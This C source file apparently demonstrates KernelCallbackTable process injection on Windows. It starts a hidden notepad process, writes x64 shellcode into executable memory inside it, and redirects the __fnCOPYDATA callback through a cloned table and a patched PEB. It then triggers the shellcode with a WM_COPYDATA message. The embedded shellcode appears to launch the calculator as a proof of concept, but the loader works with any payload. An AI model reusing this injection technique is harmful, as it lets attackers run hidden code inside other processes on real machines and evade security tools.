#include <stdio.h>
#include "struct.h"

int main(){
    unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
    SIZE_T payloadSize = sizeof(payload);

	printf("[.] Creating sacrifical process..\n");
	//Create target process
	PROCESS_INFORMATION pi;
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	CreateProcess(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	printf("[.] Waiting for process initialization..\n");

	WaitForInputIdle(pi.hProcess, 1000);

	//Get the window handle to trigger the payload by sending message
	HWND hWindow = FindWindow(L"Notepad", NULL);
	printf("[+] Window Handle: 0x%p\n", hWindow);

	//Get the process id to inject the payload to kernelcallbacktable
	DWORD pid;
	GetWindowThreadProcessId(hWindow, &pid);
	printf("[+] Process ID: %d\n", pid);

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[+] Process Handle: 0x%p\n", hProcess);
	printf("[+] Process Created!\n");
	printf("[ Enter Any Key ]\n");
	getchar();
	
	printf("[.] Reading PEB & KernelCallBackTable..\n");
	//Read PEB & KernelCallBackTable
	PROCESS_BASIC_INFORMATION pbi;
	PFNtQueryInformationProcess pNtQueryInformationProcess = (PFNtQueryInformationProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
	pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	PEB peb;
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	printf("[+] PEB: 0x%p\n", pbi.PebBaseAddress);

	KERNELCALLBACKTABLE kct;
	ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
	printf("[+] KernelCallbackTable: 0x%p\n", peb.KernelCallbackTable);
	printf("\n");

	printf("[.] Writing payload to remote buffer..\n");
	//Write the payload to remote buffer
	LPVOID remotebuf = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, remotebuf, payload, payloadSize, NULL);
	printf("[+] Payload Address: 0x%p\n", remotebuf);
	printf("\n");

	printf("[.] Modifiying __fnCOPYDATA to payload..\n");
	//Modify the __fnCOPYDATA to payload & Clone the modified KernelCallBackTable
	LPVOID cloneKCT = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	kct.__fnCOPYDATA = (ULONG_PTR)remotebuf;
	printf("[+] __fnCOPYDATA: 0x%p\n", kct.__fnCOPYDATA);
	printf("\n");

	printf("[.] Cloning modified KernelCallBackTable..\n");
	WriteProcessMemory(hProcess, cloneKCT, &kct, sizeof(kct), NULL);
	printf("[+] Cloned KernelCallBackTable: 0x%p\n", cloneKCT);
	printf("\n");

	printf("[.] Updating PEB KernelCallBackTable to cloned KernelCallBackTable..\n");
	//Update PEB KernelCallBackTable to cloned KernelCallBackTable
	WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &cloneKCT, sizeof(ULONG_PTR), NULL);
	printf("[+] PEB Updated!\n");
	printf("[ Enter Any Key ]\n");
	getchar();

	printf("[.] Sending message to trigger the payload..\n");
	//Trigger the payload by sending message
	COPYDATASTRUCT cds;
	wchar_t msg[] = L"LJX";
	cds.dwData = 1;
	cds.cbData = lstrlen(msg) * 2;
	cds.lpData = msg;
	SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
	printf("[+] Payload triggered!\n");

	VirtualFree(remotebuf, payloadSize, MEM_DECOMMIT);
	VirtualFree(remotebuf, 0, MEM_RELEASE);

	VirtualFree(cloneKCT, payloadSize, MEM_DECOMMIT);
	VirtualFree(cloneKCT, 0, MEM_RELEASE);

	TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	CloseWindow(hWindow);

	return 0;
}